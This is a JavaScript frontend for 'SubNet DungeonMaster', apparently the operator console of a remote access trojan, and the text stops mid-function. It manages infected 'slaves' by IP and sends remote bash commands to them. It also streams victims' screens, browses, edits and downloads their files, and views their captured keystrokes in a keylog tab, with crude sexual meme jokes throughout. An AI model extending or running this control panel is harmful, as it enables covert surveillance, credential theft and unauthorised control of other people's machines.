/**
 * SubNet DungeonMaster — frontend
 *
 * Hotkeys: 1–5 tabs, S drawer, R reconnect, Esc, Ctrl+L bash
 * Bash: ↑↓ history
 * playSound(base64 [, mime]) / stopSound()
 */

(function () {
  'use strict';

  const $  = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => [...root.querySelectorAll(sel)];

  function on(el, ev, fn, opts) {
    if (el) el.addEventListener(ev, fn, opts);
  }

  function callPython(method, ...args) {
    try {
      if (window.pywebview && window.pywebview.api && typeof window.pywebview.api[method] === 'function') {
        return window.pywebview.api[method](...args);
      }
    } catch (e) {
      console.warn('[pywebview]', method, e);
    }
    console.log(`[stub] ${method}`, ...args);
    return Promise.resolve(null);
  }

  function escapeHtml(str) {
    const d = document.createElement('div');
    d.textContent = str == null ? '' : String(str);
    return d.innerHTML;
  }

  function joinPath(base, name) {
    if (!base || base === '/') return '/' + String(name).replace(/^\/+/, '');
    return base.replace(/\/+$/, '') + '/' + String(name).replace(/^\/+/, '');
  }

  function parentPath(path) {
    if (!path || path === '/') return '/';
    const parts = path.replace(/\/+$/, '').split('/');
    parts.pop();
    return parts.join('/') || '/';
  }

  const PAGE_ORDER = ['info', 'screen', 'bash', 'explorer', 'keylog'];
  const BASH_HISTORY_KEY = 'dm_bash_history';
  const BASH_HISTORY_MAX = 80;

  let currentPage = 'info';
  let activeSlaveId = null;
  let slavesTreeData = [];
  let slavesIndex = {};
  let explorerPath = '/';
  let explorerEntries = [];
  let explorerOpenPath = null;
  let cmEditor = null;
  let keylogEntries = [];
  let keylogSelected = new Set();

  let bashHistory = [];
  try {
    bashHistory = JSON.parse(localStorage.getItem(BASH_HISTORY_KEY) || '[]');
    if (!Array.isArray(bashHistory)) bashHistory = [];
  } catch (_) { bashHistory = []; }
  let bashHistoryIdx = -1;
  let bashDraft = '';

  const splash = $('#splash');
  const app = $('#app');
  const passwordInp = $('#password');
  const btnLogin = $('#btn-login');
  const loginError = $('#login-error');
  const btnSlaves = $('#btn-slaves');
  const drawer = $('#drawer');
  const drawerOverlay = $('#drawer-overlay');
  const btnDrawerClose = $('#btn-drawer-close');
  const slavesTreeEl = $('#slaves-tree');
  const tabs = $('#tabs');
  const infoGrid = $('#info-grid');
  const infoMeta = $('#info-meta');
  const infoNoSlave = $('#info-no-slave');
  const screenImg = $('#screen-img');
  const screenPlaceholder = $('#screen-placeholder');
  const dropzone = $('#screen-dropzone');
  const bashOutput = $('#bash-output');
  const bashInput = $('#bash-input');
  const activeSlaveBar = $('#active-slave-bar');
  const activeSlaveName = $('#active-slave-name');
  const activeSlaveDot = $('#active-slave-dot');
  const btnCloseSlave = $('#btn-close-slave');
  const announceContainer = $('#announce-container');
  const iconMaximize = $('#icon-maximize');
  const iconRestore = $('#icon-restore');
  const stateList = $('#state-list');
  const stateMeta = $('#state-meta');
  const stateEmpty = $('#state-empty');
  const explorerTree = $('#explorer-tree');
  const explorerPathEl = $('#explorer-path');
  const explorerFileName = $('#explorer-file-name');
  const explorerImageWrap = $('#explorer-image-wrap');
  const explorerImage = $('#explorer-image');
  const explorerEditorWrap = $('#explorer-editor-wrap');
  const explorerEditor = $('#explorer-editor');
  const explorerViewerEmpty = $('#explorer-viewer-empty');
  const btnExplorerSave = $('#btn-explorer-save');
  const btnExplorerClose = $('#btn-explorer-close-viewer');
  const btnExplorerDownload = $('#btn-explorer-download');
  const keylogList = $('#keylog-list');
  const keylogEmpty = $('#keylog-empty');
  const keylogMeta = $('#keylog-meta');
  const keylogFrom = $('#keylog-from');
  const keylogTo = $('#keylog-to');
  const btnKeylogApply = $('#btn-keylog-apply');
  const btnKeylogSave = $('#btn-keylog-save');

  function isTypingTarget(el) {
    if (!el) return false;
    const tag = (el.tagName || '').toUpperCase();
    if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return true;
    if (el.isContentEditable) return true;
    if (el.closest && el.closest('.CodeMirror')) return true;
    return false;
  }

  function pushBashHistory(cmd) {
    if (!cmd) return;
    if (bashHistory[0] === cmd) return;
    bashHistory.unshift(cmd);
    if (bashHistory.length > BASH_HISTORY_MAX) bashHistory.length = BASH_HISTORY_MAX;
    try { localStorage.setItem(BASH_HISTORY_KEY, JSON.stringify(bashHistory)); } catch (_) {}
  }

  function sendAnnounce(message, type) {
    type = type || 'info';
    if (!announceContainer) return;
    const el = document.createElement('div');
    el.className = 'announce ' + type;
    el.innerHTML = '<span class="announce-msg">' + escapeHtml(message) + '</span><button class="announce-close" type="button">×</button>';
    const dismiss = () => { el.classList.add('hiding'); setTimeout(() => el.remove(), 300); };
    on(el.querySelector('.announce-close'), 'click', dismiss);
    announceContainer.appendChild(el);
    setTimeout(dismiss, type === 'error' ? 8000 : 5000);
  }

  function setLoginError(msg) {
    if (!loginError) return;
    if (!msg) { loginError.hidden = true; loginError.textContent = ''; return; }
    loginError.textContent = msg; loginError.hidden = false;
  }

  function setMaximized(state) {
    if (iconMaximize) iconMaximize.hidden = !!state;
    if (iconRestore) iconRestore.hidden = !state;
  }

  function updateNoSlaveHint() {
    const noSlave = !activeSlaveId;
    if (infoNoSlave) infoNoSlave.classList.toggle('visible', noSlave);
    if (infoGrid) infoGrid.style.display = noSlave ? 'none' : '';
    if (bashInput) {
      bashInput.disabled = noSlave;
      bashInput.placeholder = noSlave ? 'select a slave first, master…' : 'command…';
    }
  }

  function updateActiveSlaveBar(slave) {
    if (!activeSlaveBar) return;
    if (!slave) { activeSlaveBar.hidden = true; return; }
    activeSlaveBar.hidden = false;
    if (activeSlaveName) activeSlaveName.textContent = slave.displayName || slave.id;
    if (activeSlaveDot) activeSlaveDot.classList.toggle('online', !!slave.online);
  }

  function switchPage(name) {
    if (!name || name === currentPage) return;
    if (PAGE_ORDER.indexOf(name) < 0) return;
    currentPage = name;
    $$('.tab').forEach(t => t.classList.toggle('active', t.dataset.page === name));
    $$('.page').forEach(p => p.classList.toggle('active', p.id === 'page-' + name));
    callPython('on_page_change', name);
    if (name === 'bash' && bashInput) setTimeout(() => bashInput.focus(), 50);
    if (name === 'explorer' && cmEditor) setTimeout(() => cmEditor.refresh(), 50);
  }

  function openDrawer() {
    if (drawer) drawer.classList.add('open');
    if (drawerOverlay) drawerOverlay.classList.add('open');
  }
  function closeDrawer() {
    if (drawer) drawer.classList.remove('open');
    if (drawerOverlay) drawerOverlay.classList.remove('open');
  }
  function toggleDrawer() {
    if (drawer && drawer.classList.contains('open')) closeDrawer();
    else openDrawer();
  }

  function doReconnect() {
    const btn = $('#btn-reconnect');
    if (btn) {
      btn.classList.add('spinning');
      setTimeout(() => btn.classList.remove('spinning'), 900);
    }
    callPython('on_reconnect');
  }


  function setAuthenticated(state) {
    if (state) {
      if (splash) splash.hidden = true;
      if (app) app.hidden = false;
      updateNoSlaveHint();
    } else {
      if (app) app.hidden = true;
      if (splash) splash.hidden = false;
      if (passwordInp) passwordInp.value = '';
      setLoginError(null);
      closeSlave(false);
    }
  }

  function onLogin() {
    if (!passwordInp) return;
    const v = (passwordInp.value || '').trim().toLowerCase().replace(/\s+/g, '');
    const secrets = {
      '300': 'Fisting is 300 bucks — noted, master',
      'billy': 'Billy Herrington has entered the dungeon',
      'van': 'Van Darkholme is watching',
      'asswecan': 'Protocol ASS-WE-CAN engaged',
      'lotion': 'It is so deep… in the logs',
    };
    if (secrets[v]) sendAnnounce(secrets[v], 'success');
    callPython('log_in', passwordInp.value);
  }

  function bindDrag(el) {
    if (!el) return;
    let startX, startY;
    on(el, 'mousedown', (e) => {
      if (e.button !== 0) return;
      if (e.target.closest('button, input, select, a, .no-drag')) return;
      startX = e.screenX; startY = e.screenY;
      const onMove = (ev) => {
        const dx = ev.screenX - startX, dy = ev.screenY - startY;
        startX = ev.screenX; startY = ev.screenY;
        callPython('window_move', dx, dy);
      };
      const onUp = () => {
        document.removeEventListener('mousemove', onMove);
        document.removeEventListener('mouseup', onUp);
      };
      document.addEventListener('mousemove', onMove);
      document.addEventListener('mouseup', onUp);
    });
  }

  // window controls
  on($('#btn-minimize'), 'click', () => callPython('window_minimize'));
  on($('#btn-maximize'), 'click', () => callPython('window_maximize'));
  on($('#btn-close'), 'click', () => callPython('window_close'));
  on($('#btn-splash-minimize'), 'click', () => callPython('window_minimize'));
  on($('#btn-splash-close'), 'click', () => callPython('window_close'));
  on(btnLogin, 'click', onLogin);
  on(passwordInp, 'keydown', (e) => { if (e.key === 'Enter') onLogin(); });
  bindDrag($('#titlebar-drag'));
  bindDrag($('#splash-drag'));

  on(tabs, 'click', (e) => {
    const btn = e.target.closest('.tab');
    if (!btn) return;
    switchPage(btn.dataset.page);
  });

  on(btnSlaves, 'click', toggleDrawer);
  on(btnDrawerClose, 'click', closeDrawer);
  on(drawerOverlay, 'click', closeDrawer);

  const btnSlavesRefresh = $('#btn-slaves-refresh');
  on(btnSlavesRefresh, 'click', () => {
    if (btnSlavesRefresh) {
      btnSlavesRefresh.classList.add('spinning');
      setTimeout(() => btnSlavesRefresh.classList.remove('spinning'), 800);
    }
    callPython('on_slaves_refresh');
  });
  on($('#btn-reconnect'), 'click', doReconnect);

  // ─── slaves tree ───────────────────────────────────────────
  function rebuildIndex(nodes, map) {
    map = map || {};
    slavesIndex = map;
    (nodes || []).forEach(n => {
      if (n.type === 'slave') map[n.id] = n;
      if (n.children) rebuildIndex(n.children, map);
    });
    return map;
  }

  function setSlavesTree(tree) {
    slavesTreeData = Array.isArray(tree) ? tree : [];
    rebuildIndex(slavesTreeData);
    renderSlavesTree();
    if (activeSlaveId && !slavesIndex[activeSlaveId]) closeSlave(false);
    else if (activeSlaveId) updateActiveSlaveBar(slavesIndex[activeSlaveId]);
  }

  function renderSlavesTree() {
    if (!slavesTreeEl) return;
    slavesTreeEl.innerHTML = '';
    if (!slavesTreeData.length) {
      const empty = document.createElement('div');
      empty.className = 'tree-empty';
      empty.textContent = 'Dungeon is empty';
      slavesTreeEl.appendChild(empty);
    } else {
      slavesTreeData.forEach(node => {
        slavesTreeEl.appendChild(node.type === 'group' ? renderGroup(node) : renderSlave(node));
      });
    }
    slavesTreeEl.classList.add('drop-root');
    slavesTreeEl.ondragover = (e) => {
      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
      e.preventDefault();
      slavesTreeEl.classList.add('drop-target');
    };
    slavesTreeEl.ondragleave = () => slavesTreeEl.classList.remove('drop-target');
    slavesTreeEl.ondrop = (e) => {
      slavesTreeEl.classList.remove('drop-target');
      const id = e.dataTransfer.getData('application/x-slave-id');
      if (!id) return;
      e.preventDefault();
      callPython('on_slave_group_changed', id, null);
    };
  }

  function renderGroup(group) {
    const el = document.createElement('div');
    el.className = 'tree-group' + (group.collapsed ? ' collapsed' : '');
    el.dataset.group = group.name;

    const header = document.createElement('div');
    header.className = 'tree-group-header';
    header.innerHTML =
      '<span class="chevron">▼</span>' +
      '<span class="group-name">' + escapeHtml(group.name) + '</span>' +
      '<span class="group-count">' + ((group.children || []).length) + '</span>' +
      '<span class="group-actions">' +
        '<button type="button" data-act="rename" title="Rename group">✎</button>' +
        '<button type="button" data-act="delete" class="danger" title="Delete group">×</button>' +
      '</span>';

    on(header, 'click', (e) => {
      if (e.target.closest('.group-name-input') || e.target.closest('.group-actions')) return;
      el.classList.toggle('collapsed');
      callPython('on_group_toggle', group.name, el.classList.contains('collapsed'));
    });

    const nameSpan = header.querySelector('.group-name');
    on(nameSpan, 'dblclick', (e) => { e.stopPropagation(); startGroupRename(group, nameSpan); });
    on(header.querySelector('[data-act="rename"]'), 'click', (e) => {
      e.stopPropagation(); startGroupRename(group, nameSpan);
    });
    on(header.querySelector('[data-act="delete"]'), 'click', (e) => {
      e.stopPropagation();
      if (!confirm('Delete group "' + group.name + '"? Slaves will be ungrouped.')) return;
      callPython('on_group_delete', group.name);
    });

    const drop = (e) => {
      header.classList.remove('drop-target');
      const id = e.dataTransfer.getData('application/x-slave-id');
      if (!id) return;
      e.preventDefault();
      e.stopPropagation();
      callPython('on_slave_group_changed', id, group.name);
    };
    on(header, 'dragover', (e) => {
      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
      e.preventDefault(); e.stopPropagation();
      header.classList.add('drop-target');
    });
    on(header, 'dragleave', () => header.classList.remove('drop-target'));
    on(header, 'drop', drop);

    const body = document.createElement('div');
    body.className = 'tree-group-body';
    on(body, 'dragover', (e) => {
      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
      e.preventDefault(); e.stopPropagation();
      header.classList.add('drop-target');
    });
    on(body, 'drop', drop);

    (group.children || []).forEach(child => {
      body.appendChild(child.type === 'group' ? renderGroup(child) : renderSlave(child));
    });
    el.appendChild(header);
    el.appendChild(body);
    return el;
  }

  function startGroupRename(group, nameSpan) {
    if (!nameSpan || !nameSpan.parentNode) return;
    const input = document.createElement('input');
    input.className = 'group-name-input';
    input.value = group.name;
    nameSpan.replaceWith(input);
    input.focus();
    input.select();
    let done = false;
    const commit = () => {
      if (done) return;
      done = true;
      const next = input.value.trim();
      if (next && next !== group.name) {
        callPython('on_group_rename', group.name, next);
        group.name = next;
      }
      renderSlavesTree();
    };
    on(input, 'keydown', (e) => {
      if (e.key === 'Enter') { e.preventDefault(); commit(); }
      if (e.key === 'Escape') { done = true; renderSlavesTree(); }
    });
    on(input, 'blur', commit);
  }

  function renderSlave(slave) {
    const el = document.createElement('div');
    el.className = 'slave-item' + (slave.id === activeSlaveId ? ' selected' : '');
    el.dataset.id = slave.id;
    el.draggable = true;
    const pingStr = slave.ping != null ? slave.ping + ' ms' : '—';
    el.innerHTML =
      '<span class="slave-status ' + (slave.online ? 'online' : '') + '"></span>' +
      '<div class="slave-body">' +
        '<div class="slave-name-row">' +
          '<span class="slave-name">' + escapeHtml(slave.displayName || slave.id) + '</span>' +
          '<button type="button" class="btn-rename-slave" title="Rename">✎</button>' +
        '</div>' +
        '<div class="slave-meta">' +
          '<span class="id">' + escapeHtml(slave.id) + '</span>' +
          '<span>' + escapeHtml(slave.ip || '—') + '</span>' +
          '<span>' + pingStr + '</span>' +
        '</div>' +
      '</div>';

    on(el, 'click', (e) => {
      if (e.target.closest('.btn-rename-slave') || e.target.closest('.slave-name-input')) return;
      openSlave(slave.id);
    });
    on(el, 'contextmenu', (e) => {
      e.preventDefault();
      callPython('on_slave_context', slave.id, e.clientX, e.clientY);
    });

    const nameEl = el.querySelector('.slave-name');
    const startRename = (e) => {
      if (e) e.stopPropagation();
      const row = el.querySelector('.slave-name-row');
      const input = document.createElement('input');
      input.className = 'slave-name-input';
      input.value = slave.displayName || slave.id;
      nameEl.replaceWith(input);
      const btn = row && row.querySelector('.btn-rename-slave');
      if (btn) btn.hidden = true;
      input.focus();
      input.select();
      let done = false;
      const commit = () => {
        if (done) return;
        done = true;
        const next = input.value.trim();
        if (next && next !== (slave.displayName || slave.id)) {
          slave.displayName = next;
          callPython('on_slave_display_name_changed', slave.id, next);
          if (activeSlaveId === slave.id) updateActiveSlaveBar(slave);
        }
        renderSlavesTree();
      };
      on(input, 'keydown', (ev) => {
        if (ev.key === 'Enter') { ev.preventDefault(); commit(); }
        if (ev.key === 'Escape') { done = true; renderSlavesTree(); }
      });
      on(input, 'blur', commit);
    };
    on(nameEl, 'dblclick', startRename);
    on(el.querySelector('.btn-rename-slave'), 'click', startRename);
    on(el, 'dragstart', (e) => {
      e.dataTransfer.setData('application/x-slave-id', slave.id);
      e.dataTransfer.effectAllowed = 'move';
      el.classList.add('dragging');
    });
    on(el, 'dragend', () => el.classList.remove('dragging'));
    return el;
  }

  on($('#btn-slaves-add-group'), 'click', () => {
    const name = prompt('Group name');
    if (!name || !name.trim()) return;
    callPython('on_group_create', name.trim());
  });

  function openSlave(id) {
    const slave = slavesIndex[id];
    if (!slave) return;
    const prev = activeSlaveId;
    activeSlaveId = id;
    $$('.slave-item').forEach(s => s.classList.toggle('selected', s.dataset.id === id));
    updateActiveSlaveBar(slave);
    updateNoSlaveHint();
    if (prev !== id) {
      setInfo({}); setScreen(null); clearBash();
      appendBash('Slave ' + (slave.displayName || id) + ' joined the dungeon', 'sys');
    }
    callPython('on_slave_open', id);
  }

  function closeSlave(notify) {
    if (notify === undefined) notify = true;
    const prev = activeSlaveId;
    activeSlaveId = null;
    $$('.slave-item').forEach(s => s.classList.remove('selected'));
    if (activeSlaveBar) activeSlaveBar.hidden = true;
    updateNoSlaveHint();
    setInfo({}); setScreen(null); clearBash();
    if (notify && prev) callPython('on_slave_close', prev);
  }

  on(btnCloseSlave, 'click', () => closeSlave(true));

  function setInfo(data) {
    if (!infoGrid) return;
    infoGrid.innerHTML = '';
    let entries = [];
    if (Array.isArray(data)) entries = data.map(item => [item.key, item.value]);
    else if (data && typeof data === 'object') entries = Object.entries(data);
    if (!entries.length) {
      if (activeSlaveId) {
        const empty = document.createElement('div');
        empty.className = 'info-empty';
        empty.style.gridColumn = '1 / -1';
        empty.textContent = 'No data';
        infoGrid.appendChild(empty);
      }
      if (infoMeta) infoMeta.textContent = '—';
      return;
    }
    entries.forEach(([key, value]) => {
      const card = document.createElement('div');
      card.className = 'info-card';
      card.innerHTML = '<span class="key">' + escapeHtml(key) + '</span><span class="value">' + escapeHtml(value) + '</span>';
      infoGrid.appendChild(card);
    });
    if (infoMeta) infoMeta.textContent = entries.length + ' item' + (entries.length === 1 ? '' : 's');
  }

  function setScreen(base64, mime) {
    if (!screenImg) return;
    if (!base64) {
      screenImg.hidden = true; screenImg.removeAttribute('src');
      if (screenPlaceholder) screenPlaceholder.hidden = false;
      return;
    }
    let src = base64;
    if (typeof base64 === 'string' && !base64.startsWith('data:')) {
      src = 'data:' + (mime || 'image/jpeg') + ';base64,' + base64.replace(/\s+/g, '');
    }
    screenImg.src = src; screenImg.hidden = false;
    if (screenPlaceholder) screenPlaceholder.hidden = true;
  }

  if (dropzone) {
    ['dragenter', 'dragover'].forEach(ev => {
      on(dropzone, ev, (e) => { e.preventDefault(); e.stopPropagation(); dropzone.classList.add('drag-over'); });
    });
    ['dragleave', 'drop'].forEach(ev => {
      on(dropzone, ev, (e) => { e.preventDefault(); e.stopPropagation(); dropzone.classList.remove('drag-over'); });
    });
    on(dropzone, 'drop', (e) => {
      const files = e.dataTransfer.files;
      if (!files || !files.length) return;
      const file = files[0];
      if (!file.type.startsWith('image/')) { callPython('on_screen_drop', null, 'not_image'); return; }
      const reader = new FileReader();
      reader.onload = () => { setScreen(reader.result); callPython('on_screen_drop', reader.result, file.name); };
      reader.readAsDataURL(file);
    });
  }
  on($('#btn-screen-expand'), 'click', () => callPython('on_screen_expand'));
  on($('#screen-fps'), 'change', (e) => callPython('on_screen_fps', Number(e.target.value)));
  on($('#screen-quality'), 'change', (e) => callPython('on_screen_quality', e.target.value));

  function appendBash(text, type) {
    if (!bashOutput) return;
    type = type || 'out';
    const line = document.createElement('div');
    line.className = 'bash-line ' + type;
    line.textContent = text;
    bashOutput.appendChild(line);
    bashOutput.scrollTop = bashOutput.scrollHeight;
  }
  function clearBash() { if (bashOutput) bashOutput.innerHTML = ''; }

  function submitBash() {
    if (!activeSlaveId) { sendAnnounce('No slave selected, master', 'warn'); return; }
    if (!bashInput) return;
    const cmd = bashInput.value.trim();
    if (!cmd) return;
    appendBash(cmd, 'cmd');
    pushBashHistory(cmd);
    bashHistoryIdx = -1;
    bashDraft = '';
    bashInput.value = '';
    callPython('on_bash_command', cmd);
  }

  on(bashInput, 'keydown', (e) => {
    if (e.key === 'Enter') { e.preventDefault(); submitBash(); return; }
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (!bashHistory.length) return;
      if (bashHistoryIdx < 0) bashDraft = bashInput.value;
      if (bashHistoryIdx < bashHistory.length - 1) bashHistoryIdx++;
      bashInput.value = bashHistory[bashHistoryIdx] || '';
      return;
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (bashHistoryIdx < 0) return;
      bashHistoryIdx--;
      bashInput.value = bashHistoryIdx < 0 ? bashDraft : (bashHistory[bashHistoryIdx] || '');
    }
  });

  // bash secrets (capture) — work without selected slave
  const GACHI_QUOTES = [
    'Ass we can', 'Thank you sir', '300 bucks', 'Boss of this gym',
    'Deep dark fantasies', 'It is so deep', 'I am an artist', 'Fisting is 300 bucks',
  ];
  const BASH_SECRETS = {
    'boss of this gym': 'You are now boss of this gym',
    'ass we can': 'YES WE CAN',
    'thank you sir': 'You are welcome, master',
    '300 bucks': 'Invoice sent to the dungeon',
    'gachi': null,
    'lotion': 'Application requires elevated privileges',
  };
  on(bashInput, 'keydown', (e) => {
    if (e.key !== 'Enter') return;
    const raw = (bashInput.value || '').trim();
    const cmd = raw.toLowerCase();
    if (!(cmd in BASH_SECRETS)) return;
    e.stopImmediatePropagation();
    e.preventDefault();
    const code = BASH_SECRETS[cmd];
    appendBash(raw, 'cmd');
    pushBashHistory(raw);
    bashHistoryIdx = -1;
    bashInput.value = '';
    const msg = code === null
      ? GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)]
      : code;
    appendBash(msg, 'sys');
    sendAnnounce(msg, 'success');
  }, true);

  // STATE (panel inside INFO)
  function setSlaveState(items) {
    if (!stateList) return;
    stateList.innerHTML = '';
    const list = Array.isArray(items) ? items : [];
    if (stateEmpty) stateEmpty.classList.toggle('visible', !list.length);
    if (stateMeta) stateMeta.textContent = list.length ? String(list.length) : '—';
    list.forEach((item) => {
      const el = document.createElement('div');
      el.className = 'state-item';
      const statusClass = String(item.status || '').toLowerCase().replace(/\s+/g, '-');
      const actions = (item.actions || []).map((a) => {
        const id = typeof a === 'string' ? a : a.id;
        const label = typeof a === 'string' ? a : (a.label || a.id);
        return '<button class="tool-btn" data-action="' + escapeHtml(id) + '">' + escapeHtml(label) + '</button>';
      }).join('');
      el.innerHTML =
        '<div class="state-item-body">' +
          '<div class="state-item-name">' + escapeHtml(item.name || item.id || '—') + '</div>' +
          '<div class="state-item-desc">' + escapeHtml(item.description || '') + '</div>' +
        '</div>' +
        '<span class="state-item-status ' + escapeHtml(statusClass) + '">' + escapeHtml(item.status || '—') + '</span>' +
        '<div class="state-item-actions">' + actions + '</div>';
      el.querySelectorAll('[data-action]').forEach((btn) => {
        on(btn, 'click', () => callPython('on_state_action', item.id || item.name, btn.dataset.action));
      });
      stateList.appendChild(el);
    });
  }

  // EXPLORER
  function initCodeMirror() {
    if (cmEditor || typeof CodeMirror === 'undefined' || !explorerEditor) return;
    cmEditor = CodeMirror.fromTextArea(explorerEditor, {
      theme: 'material-darker', lineNumbers: true, lineWrapping: true, indentUnit: 4, mode: 'text/plain'
    });
  }
  function guessMode(path) {
    const ext = (path || '').split('.').pop().toLowerCase();
    const map = { js: 'javascript', ts: 'javascript', py: 'python', html: 'htmlmixed', htm: 'htmlmixed', css: 'css', json: 'application/json', xml: 'xml' };
    return map[ext] || 'text/plain';
  }
  function isImageName(name) { return /\.(png|jpe?g|gif|webp|bmp|svg)$/i.test(name || ''); }

  function setExplorerPath(path) {
    explorerPath = path == null || path === '' ? '/' : String(path);
    if (explorerPathEl) explorerPathEl.textContent = explorerPath;
  }

  function setLocal(entries, path) {
    if (path != null) setExplorerPath(path);
    explorerEntries = Array.isArray(entries) ? entries.slice() : [];
    explorerEntries.sort((a, b) => {
      if (!!a.folder !== !!b.folder) return a.folder ? -1 : 1;
      return String(a.name).localeCompare(String(b.name));
    });
    if (explorerPathEl) explorerPathEl.textContent = explorerPath;
    renderExplorerTree();
  }

  function renderExplorerTree() {
    if (!explorerTree) return;
    explorerTree.innerHTML = '';
    if (!explorerEntries.length) {
      const empty = document.createElement('div');
      empty.className = 'tree-empty'; empty.textContent = 'Empty';
      explorerTree.appendChild(empty); return;
    }
    explorerEntries.forEach((entry) => {
      const full = joinPath(explorerPath, entry.name);
      const el = document.createElement('div');
      el.className = 'explorer-item' + (entry.folder ? ' folder' : '') + (explorerOpenPath === full ? ' selected' : '');
      el.draggable = true;
      el.innerHTML =
        '<span class="icon">' + (entry.folder ? '▣' : '▤') + '</span>' +
        '<span class="explorer-item-name">' + escapeHtml(entry.name) + '</span>' +
        '<span class="explorer-item-actions">' +
          (entry.folder ? '' : '<button type="button" data-act="download" title="Download">↓</button>') +
          '<button type="button" data-act="rename" title="Rename">✎</button>' +
          '<button type="button" data-act="remove" title="Remove">×</button>' +
        '</span>';

      on(el, 'click', (e) => {
        if (e.target.closest('[data-act]')) return;
        if (entry.folder) callPython('on_open_folder', full);
        else callPython('on_open_file', full);
      });
      const dl = el.querySelector('[data-act="download"]');
      on(dl, 'click', (e) => { e.stopPropagation(); callPython('on_file_download', full); });
      on(el.querySelector('[data-act="remove"]'), 'click', (e) => {
        e.stopPropagation(); callPython('on_item_remove', full, !!entry.folder);
      });
      on(el.querySelector('[data-act="rename"]'), 'click', (e) => {
        e.stopPropagation();
        const next = prompt('Rename to', entry.name);
        if (!next || next === entry.name) return;
        callPython('on_rename', full, joinPath(explorerPath, next));
      });
      on(el, 'dragstart', (e) => {
        e.dataTransfer.setData('application/x-explorer-path', full);
        e.dataTransfer.setData('application/x-explorer-folder', entry.folder ? '1' : '0');
        e.dataTransfer.effectAllowed = 'move';
        el.classList.add('dragging');
      });
      on(el, 'dragend', () => el.classList.remove('dragging'));
      if (entry.folder) {
        on(el, 'dragover', (e) => {
          if (!e.dataTransfer.types.includes('application/x-explorer-path')) return;
          e.preventDefault(); e.stopPropagation();
          el.classList.add('drop-target');
        });
        on(el, 'dragleave', () => el.classList.remove('drop-target'));
        on(el, 'drop', (e) => {
          el.classList.remove('drop-target');
          const src = e.dataTransfer.getData('application/x-explorer-path');
          if (!src || src === full) return;
          e.preventDefault(); e.stopPropagation();
          const baseName = src.split('/').filter(Boolean).pop();
          callPython('on_move', src, joinPath(full, baseName));
        });
      }
      explorerTree.appendChild(el);
    });
  }

  function setExplorerFile(path, content, isImage) {
    explorerOpenPath = path;
    if (explorerFileName) explorerFileName.textContent = path || '—';
    if (btnExplorerSave) btnExplorerSave.hidden = false;
    if (btnExplorerClose) btnExplorerClose.hidden = false;
    if (explorerViewerEmpty) explorerViewerEmpty.hidden = true;
    if (btnExplorerDownload) btnExplorerDownload.hidden = false;
    const image = isImage === true || (isImage == null && isImageName(path));
    if (image) {
      if (explorerEditorWrap) explorerEditorWrap.hidden = true;
      if (explorerImageWrap) explorerImageWrap.hidden = false;
      if (btnExplorerSave) btnExplorerSave.hidden = true;
      let src = content || '';
      if (src && !src.startsWith('data:') && !src.startsWith('http')) {
        src = 'data:image/png;base64,' + String(src).replace(/\s+/g, '');
      }
      if (explorerImage) explorerImage.src = src;
    } else {
      if (explorerImageWrap) explorerImageWrap.hidden = true;
      if (explorerEditorWrap) explorerEditorWrap.hidden = false;
      initCodeMirror();
      const text = content == null ? '' : String(content);
      if (cmEditor) {
        cmEditor.setValue(text);
        cmEditor.setOption('mode', guessMode(path));
        setTimeout(() => cmEditor.refresh(), 30);
      } else if (explorerEditor) explorerEditor.value = text;
    }
    renderExplorerTree();
  }

  function closeExplorerViewer() {
    explorerOpenPath = null;
    if (explorerFileName) explorerFileName.textContent = '—';
    if (btnExplorerSave) btnExplorerSave.hidden = true;
    if (btnExplorerClose) btnExplorerClose.hidden = true;
    if (btnExplorerDownload) btnExplorerDownload.hidden = true;
    if (explorerImageWrap) explorerImageWrap.hidden = true;
    if (explorerEditorWrap) explorerEditorWrap.hidden = true;
    if (explorerViewerEmpty) explorerViewerEmpty.hidden = false;
    if (explorerImage) explorerImage.removeAttribute('src');
    if (cmEditor) cmEditor.setValue('');
    renderExplorerTree();
  }

  on($('#btn-explorer-up'), 'click', () => callPython('on_open_folder', parentPath(explorerPath)));
  on($('#btn-explorer-new-file'), 'click', () => {
    const name = prompt('File name'); if (!name) return;
    callPython('on_create_item', joinPath(explorerPath, name), false);
  });
  on($('#btn-explorer-new-folder'), 'click', () => {
    const name = prompt('Folder name'); if (!name) return;
    callPython('on_create_item', joinPath(explorerPath, name), true);
  });
  on($('#btn-explorer-refresh'), 'click', () => callPython('on_open_folder', explorerPath));
  on(btnExplorerSave, 'click', () => {
    if (!explorerOpenPath) return;
    callPython('on_save_file', explorerOpenPath, cmEditor ? cmEditor.getValue() : (explorerEditor && explorerEditor.value));
  });
  on(btnExplorerDownload, 'click', () => {
    if (!explorerOpenPath) return;
    callPython('on_file_download', explorerOpenPath);
  });
  on(btnExplorerClose, 'click', closeExplorerViewer);

  // KEYLOG
  function setKeyLog(entries) {
    keylogEntries = Array.isArray(entries) ? entries.slice() : [];
    keylogSelected.clear();
    if (btnKeylogSave) btnKeylogSave.disabled = true;
    renderKeyLog();
  }

  function renderKeyLog() {
    if (!keylogList) return;
    keylogList.innerHTML = '';
    if (keylogEmpty) keylogEmpty.classList.toggle('visible', !keylogEntries.length);
    if (keylogMeta) keylogMeta.textContent = keylogEntries.length ? String(keylogEntries.length) : '—';
    if (!keylogEntries.length) return;
    const groups = {};
    keylogEntries.forEach((e, idx) => {
      const day = (e.time || '').slice(0, 10) || 'unknown';
      if (!groups[day]) groups[day] = [];
      groups[day].push({ e, idx });
    });
    Object.keys(groups).sort().forEach((day) => {
      const header = document.createElement('div');
      header.className = 'keylog-date'; header.textContent = day;
      keylogList.appendChild(header);
      groups[day].forEach(({ e, idx }) => {
        const row = document.createElement('div');
        row.className = 'keylog-item' + (keylogSelected.has(idx) ? ' selected' : '');
        const timeStr = (e.time || '').includes('T') ? (e.time.split('T')[1] || e.time).slice(0, 12) : (e.time || '');
        row.innerHTML = '<input type="checkbox" ' + (keylogSelected.has(idx) ? 'checked' : '') + ' /><span class="keylog-time">' + escapeHtml(timeStr) + '</span><span class="keylog-key">' + escapeHtml(e.key) + '</span>';
        const cb = row.querySelector('input');
        const toggle = () => {
          if (keylogSelected.has(idx)) keylogSelected.delete(idx); else keylogSelected.add(idx);
